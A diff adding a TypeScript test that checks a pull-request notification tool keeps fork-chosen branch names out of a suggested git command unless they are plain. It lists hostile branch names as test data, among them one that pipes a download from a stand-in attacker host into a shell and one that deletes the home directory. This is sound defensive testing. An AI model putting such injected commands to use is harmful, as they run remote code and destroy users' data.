@@ -121,3 +121,13 @@ test("clean shortens and keeps one line", () => {
   assert.equal(clean("x".repeat(100), 10), `${"x".repeat(9)}…`);
   assert.equal(clean(null), "");
 });
+
+test("a branch name goes into a suggested command only when it is plain: a fork chooses it, and it could hold shell", () => {
+  const moved = (headRef: string) => toMessage({ kind: "pr.head_moved", snapshot: { ...snapshot, headRef } }).content;
+  assert.match(moved("feature/login-v2.1_fix"), /git log HEAD\.\.origin\/feature\/login-v2\.1_fix\)/);
+  for (const evil of ["x$(curl evil.example|sh)", "x`id`", "a;rm -rf ~", "a|b", "a&&b", "a>b"]) {
+    const text = moved(evil);
+    assert.match(text, /git log HEAD\.\.origin\/<branch>\)/, evil);
+    for (const bad of ["$(", "`", ";rm", "|b", "&&", ">b"]) assert.equal(text.includes(bad), false, `${evil}: ${text}`);
+  }
+});
